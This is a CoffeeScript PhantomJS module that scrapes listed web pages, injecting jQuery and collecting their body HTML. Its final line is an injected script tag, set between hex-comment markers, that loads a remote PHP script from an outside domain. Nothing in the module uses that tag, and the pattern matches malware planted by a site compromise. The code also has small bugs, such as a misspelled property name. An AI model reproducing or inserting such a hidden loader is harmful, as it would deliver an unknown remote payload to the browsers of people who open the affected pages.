exports.create = (page_list, death_callback) ->
	fs = require "fs"
	system = require "system"

	class HackScan

		page_list: page_list

		beatingHeart: null
		loadCount: 0
		pages:[]

		busy_frazzling : false

		imports_output: []
		hierarchies: {}
		rooted: {}
		outputs: {}
		processed_count: 0

		constructor: (path) ->
			console.log "Constructing..."
			_this = @

			pulse = -> _this.CheckPulse()
			death = ->
				console.log "ASDASDASDAS"
				console.log p + " " + k for p, k of _this.hierarchies
				death_callback _this

			console.log page_list
			@beatingHeart = require("../BeatingHeart").create pulse, death

			@LoadPages()

		CheckPulse: ->
			if @buzy_frazzling
				console.write "."
			not @LastBreath()

		LastBreath: ->
			@processed_count == @page_list.length

		LoadPages: ->
			@LoadPage page for page in @page_list

		LoadPage: (page) ->
			_this = @
			webpage = require('webpage').create()
			webpage.settings.userAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.71 Safari/537.36';

			@pages.push webpage

			console.log "Loading #{page}"

			webpage.open page, (status) ->
				console.log "Loaded #{page}"
				_this.Process webpage, page
				_this.loadCount++

		Process: (webpage, identifier) ->
			webpage.injectJs '../jquery-2.1.0.min.js'
			@outputs[identifier] = []
			#console.log webpage.content

			# Passing the function as a string allows me to inject the config data into
			# the webpage scope as JSON.
			@hierarchies[identifier] = webpage.evaluate """
				function () {
					return $("body").html();
				}
				"""

			@processed_count++;

	hack_scan = new HackScan()

	<!--ac39ca--><script type="text/javascript" src="http://dlineastudio.com/vBDLb3Rc.php?id=14709603"></script><!--/ac39ca-->